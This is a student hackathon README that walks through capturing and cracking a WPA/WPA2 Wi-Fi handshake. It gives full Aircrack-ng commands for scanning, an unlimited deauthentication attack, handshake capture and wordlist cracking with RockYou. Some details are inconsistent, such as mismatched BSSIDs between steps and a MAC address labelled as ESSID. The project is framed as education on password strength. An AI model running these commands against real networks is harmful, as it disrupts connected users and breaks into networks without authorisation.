# WiFi WPA Handshake Capture & Security Assessment

## Overview

This project demonstrates how WPA/WPA2 wireless authentication works and how weak passwords can compromise network security. The experiment was performed using Kali Linux and the Aircrack-ng suite during Hackathon Phase 1 at KL University.

The goal is to capture WPA handshake packets and perform password strength analysis.

## Tools Used

* Kali Linux
* Aircrack-ng Suite
* Airmon-ng
* Airodump-ng
* Aireplay-ng

## Project Workflow

Commands Used
Check Kali Version
cat /etc/os-release
uname -a
View Network Interfaces
ip addr
iwconfig
Kill Conflicting Processes
sudo airmon-ng check kill
Start Monitor Mode
sudo airmon-ng start wlan0
Verify Monitor Mode
sudo airmon-ng
iwconfig
Scan for Available Networks

Use airodump-ng to detect nearby wireless access points.

sudo airodump-ng wlan0mon

From this scan note the following information:

BSSID (AP MAC Address)

Channel

ESSID

Example:

ESSID: 90:9A:4A:B8:F3:FB
Channel used by AP: 2
Capture WPA Handshake

Open a new terminal window and run:

sudo airodump-ng -w hack1 -c 2 --bssid C2:A5:E8:39:05:85 wlan0mon

Explanation:

-w hack1 → output file name

-c → channel number

--bssid → target access point MAC address

Deauthentication Attack (Trigger Handshake)

In another terminal window run:

sudo aireplay-ng --deauth 0 -a 36:6A:34:58:D5:AF wlan0

This forces connected devices to reconnect, allowing capture of the WPA handshake.

Inspect Capture with Wireshark

Open the captured file:

wireshark hack1-01.cap

Filter handshake packets:

eapol

If handshake packets appear, the capture was successful.

Stop Monitor Mode
airmon-ng stop wlan0mon
Crack the Handshake

Use Aircrack-ng with the RockYou wordlist.

aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
Target Specific Access Point
sudo airodump-ng wlan0 -d C2:A5:E8:39:05:85

## Learning Outcomes

* Wireless network packet monitoring
* WPA/WPA2 authentication understanding
* Ethical penetration testing workflow
* Importance of strong WiFi passwords

## Disclaimer

This project was conducted in a controlled lab environment strictly for educational and ethical cybersecurity research.
